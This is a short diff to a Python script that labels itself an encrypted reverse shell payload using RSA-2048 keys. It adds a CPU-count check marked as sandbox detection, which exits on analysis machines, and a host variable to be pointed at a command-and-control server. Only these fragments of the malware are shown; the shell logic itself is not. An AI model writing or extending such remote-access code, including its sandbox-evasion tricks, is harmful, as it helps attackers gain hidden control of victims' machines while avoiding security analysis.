@@ -1,4 +1,6 @@
-# Simple payload for debugging. A more advanced payload is coming soon
+# Encrypted reverse shell payload
+# Written by Logan Goins
+# RSA 2048 bit asymmetric encryption used
 
 import os
 import socket
@@ -9,7 +11,7 @@ import time
 public_key, private_key = rsa.newkeys(2048)
 public_partner = None
 
-if os.cpu_count() <= 2:
+if os.cpu_count() <= 2: # Simple sandbox detection
     quit()
 
 HOST = '127.0.0.1' # Change this host address to the address of your C2 server
